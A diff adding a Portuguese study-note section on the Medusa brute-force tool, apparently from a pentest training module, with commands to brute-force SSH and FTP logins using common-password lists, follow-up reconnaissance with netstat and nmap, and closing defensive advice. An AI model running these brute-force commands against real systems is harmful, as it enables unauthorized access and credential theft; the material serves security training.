@@ -509,3 +509,85 @@ Antes de usar o Hydra, é essencial analisar o formulário de login para obter:
 5. **Boas práticas** garantem que os testes sejam éticos e eficientes.
 ---
 # Medusa
+### **O que é Medusa (Brute-Force)?**
+
+Medusa é uma ferramenta de **força bruta** de alto desempenho usada para testar a segurança de sistemas de autenticação. Ela suporta uma variedade de protocolos, como SSH, FTP, HTTP, MySQL, RDP, entre outros. É uma alternativa ao Hydra, mas com algumas diferenças em termos de desempenho e funcionalidades.
+
+Mais Sobre em [[Medusa]]
+
+---
+
+### **1. Introdução: Segurança em Web Services**
+
+SSH e FTP são protocolos amplamente usados para acessar remotamente servidores e transferir arquivos. No entanto, autenticações baseadas apenas em senhas são vulneráveis a ataques de força bruta. O **Medusa** é uma ferramenta que permite automatizar tentativas de login para descobrir credenciais fracas.
+
+---
+
+### **2. Compreendendo os Protocolos**
+
+- **[[SSH]] (Secure Shell)**: Protocolo seguro para acesso remoto e transferência de arquivos, protegendo dados com criptografia. Porém, senhas fracas ainda representam um risco.
+- **[[FTP]] (File Transfer Protocol)**: Usado para transferir arquivos entre cliente e servidor, mas pode transmitir credenciais em **texto claro**, tornando-se um alvo fácil para interceptação e ataques de força bruta.
+
+---
+
+### **3. Ataque a um Servidor SSH com Medusa**
+
+#### **Comando de ataque:**
+
+`medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`
+
+#### **Explicação dos parâmetros:**
+
+- `-h <IP>` → IP do alvo.
+- `-n <PORT>` → Porta do SSH (padrão 22).
+- `-u sshuser` → Nome do usuário-alvo.
+- `-P 2023-200_most_used_passwords.txt` → Lista de senhas comuns em 2023.
+- `-M ssh` → Módulo SSH do Medusa.
+- `-t 3` → Três tentativas simultâneas (maior velocidade, mas pode ativar medidas de segurança).
+
+Se o ataque for bem-sucedido, o Medusa exibirá a senha correta, permitindo que o atacante faça login via SSH:
+
+`ssh sshuser@<IP> -p PORT`
+
+---
+
+### **4. Expansão do Ataque: Explorando Serviços Abertos**
+
+Após obter acesso ao SSH, o atacante pode verificar portas abertas no sistema:
+
+`netstat -tulpn | grep LISTEN`
+
+Se identificar um **FTP ativo na porta 21**, pode usar o **Nmap** para confirmar:
+
+`nmap localhost`
+
+Se o FTP estiver disponível, o próximo passo é atacar esse serviço.
+
+---
+
+### **5. Ataque ao Servidor FTP**
+
+Se houver um diretório `/home/ftpuser`, é provável que "ftpuser" seja um usuário válido. O ataque pode ser adaptado:
+
+`medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`
+
+#### **Principais mudanças:**
+
+- `-h 127.0.0.1` → O alvo é o próprio sistema local.
+- `-u ftpuser` → Usuário-alvo do FTP.
+- `-M ftp` → Módulo FTP do Medusa.
+- `-t 5` → Cinco tentativas simultâneas para maior eficiência.
+
+Se bem-sucedido, o atacante terá acesso ao FTP e poderá extrair arquivos ou enviar malwares.
+
+---
+
+### **6. Conclusão e Defesa**
+
+Este cenário ilustra como credenciais fracas podem ser exploradas. Para se proteger:
+
+- Utilize **senhas fortes** e autenticação de dois fatores (2FA).
+- Restrinja **tentativas de login** e utilize **firewalls**.
+- Substitua o **FTP tradicional por SFTP** (FTP sobre SSH) para criptografar credenciais.
+
+Esse módulo destaca a necessidade de segurança reforçada em serviços web, protegendo sistemas contra ataques automatizados.
